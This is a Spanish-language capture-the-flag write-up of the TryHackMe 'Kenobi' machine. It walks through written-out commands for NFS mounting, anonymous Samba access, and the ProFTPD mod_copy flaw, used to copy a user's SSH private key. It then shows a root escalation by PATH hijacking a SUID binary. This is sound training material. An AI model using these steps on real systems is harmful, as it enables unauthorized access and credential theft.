---
title: Kenobi
description: Write Up de Kenobi TryHackMe
published: true
date: 2025-05-12T15:30:47.552Z
tags: write up
editor: markdown
dateCreated: 2025-05-06T15:51:34.674Z
---

# Kenobi
Bienvenido a la máquina Kenobi, hecha en GitHub.

## Exploración
Lo primero que vamos a hacer es un escaneo de puertos para saber que servicios tiene disponibles.
10.10.218.69
```
nmap -sT -Pn -sV {IP}
```

![Escaneo de puertos](/imagenes/kenobi_1.png)

Como podemos observar tenemos:
- Un servicio FTP
- Un servicio SSH
- Un servicio HTTP
- Servicio de Samba
- Puero 2049

Lo más interesante que podemos observar, es la página web, el servidor ftp y el puerto 2049. Teniendo el puerto 2049, con un NFS, podemos intentar montar el disco que hay disponible.

Para ello deberemos saber que puerto hay disponible, eso lo hacemos mediante:
```
showmount -e {IP}
```

Una vez que vamos a importar, creamos una carpeta similar y lo montamos:
```
mkdir -p tmp/var
sudo mount -t nfs {IP}:/var tmp/var
```

![Conexión con el NFS](/imagenes/kenobi_2.png)

Ahora entramos en la carpeta y listamos lo que hay


![Listado de lo que podemos ver](/imagenes/kenobi_3.png)

Investigaremos esto en profundidad mas adelante, vamos a intentar conectarnos como anonymous en el servidor FTP

![Intento FTP](/imagenes/kenobi_4.png)

Sin embargo, podemos observar que no hemos puesto la credecial correcta. 

Vamos a investigar con respecto a la página web.

![No funcional](/imagenes/kenobi_5.png)

Solo tenemos una imagen, por lo que investigaremos el último servicio que nos queda que es samba.

Vamos a ejecutar el siguiente comando:
```
smbclient -L //{IP} -N
```

Con este comando vamos a ejecutar una lectura principal de usuarios y servicios activos, donde podemos ver que hay una cuenta llamada anonymous 

![Cliente de samba](/imagenes/kenobi_6.png)

Ahora vamos a intentar conectarnos como ese usuario:
```
smbclient //{IP}/anonymous
```
Nos pedirá una contraseña, sin embargo está vez si que nos permite el acceso con las credenciales predeterminadas (anonymous/anonymous).

Haremos una lectura de los archivos con un ls, y nos descargaremos el fichero que haya.

```
ls
get log.txt
```

![Conectarse y obtención de claves](/imagenes/kenobi_7.png)

Una vez descargado, vamos a leer el log, que parece ser todos los logs, tanto de samba, como de FTP y SSH.

![Lectura de logs](/imagenes/kenobi_8.png)

De este archivo no tenemos mucha mas información importante, sin embargo podriamos intentar hacer un exploit de ftp, ya que sabemos que usa proftpd y con el escaneo de nmap, podemos descubirr que es versión 1.3.5

![Explotación de ftp](/imagenes/kenobi_9.png)

Ahora vamos a hacer lo siguiente
```
nc {IP} 21
```

Con esto nos conectamos al seridor FTP, sin embargo por esta versión hay una vulnerabilidad de copia de archivos sin estar verificado, por lo que podemos continuar con:
```
site CPFR /home/kenobi/.ssh/id_rsa
site CPTO {lugar donde dejamos el archiv}
```

![Obtención de archivo id](/imagenes/kenobi_10.png)

> Tener en cuenta el directorio donde estamos
{.is-warning}


Debido a que ya tenemos el rsa, podemos conectarnos.

## Explotación
Vamos a modificar el archivo para que solo posea permisos de lectura, ya que de otra manera el archivo se identificará como peligroso.
```
chmod 600 id_rsa
```

Para conectarnos de forma remota, vamos a poner el siguiente comando:
```
ssh -i {Ubicación del fichero} kenobi@{IP}
```

![Conectarse al usuario](/imagenes/kenobi_11.png)

No podemos securizar la shell ya que para ello necesitamos administrador.


Sin embargo podemos obtener la primera flag 
![Lectura de flag](/imagenes/kenobi_12.png)

## Escalada

Ahora vamos a intentar escalar privilegios, para ello vamos el siguiente comando:
```
find / -perm -u=s 2>/dev/null
```

De todo el listado, nos llama la atención uno llamado "menu", este binario no es comun en Linux
![Investigar binarios](/imagenes/kenobi_13.png)

Cuando lo ejecutamos, parece ser que salé un pequeño menu en el que podemos comprobar versiones, mirar la versión del kernel y mirar la configuración de red.

![Ejecución de binario](/imagenes/kenobi_14.png)

Podemos intentar analizar el binario de la siguiente manera:
```
strings /usr/bin/menu
```

![Lectura del binario](/imagenes/kenobi_15.png)

Analizando el binario, parece que ejecuta los comandos sin una ruta absoluta definida. Por lo tanto será vulnerable a path hijacking, esto lo ahcemos modificando nuestro $PATH.

Comprobamos nuestro $PATH con
```
echo $PATH
```

![Lectura del path](/imagenes/kenobi_16.png)

Para la modificación, podemos copiar un binario como puede ser /bin/sh, y llamarlo ifconfig, tras esto modificaremos nuestro PATH y así podremos hacer engañar el sistema.

```
cd /tmp
echo "/bin/bash" > ifconfig
chmod +x ifconfig
PATH=/tmp:$PATH
```

![Preparación de exploit](/imagenes/kenobi_17.png)

Ahora simplemente deberemos ejecutar de nuevo el script, pero esta vez indicamos la tercera opción que es la correspondiente a el ifconfig.

![Ejecución del exploit](/imagenes/kenobi_18.png)

Ya somos root, ahora podemos ir al directorio home y obtener la ultima flag.
![Flag](/imagenes/kenobi_19.png)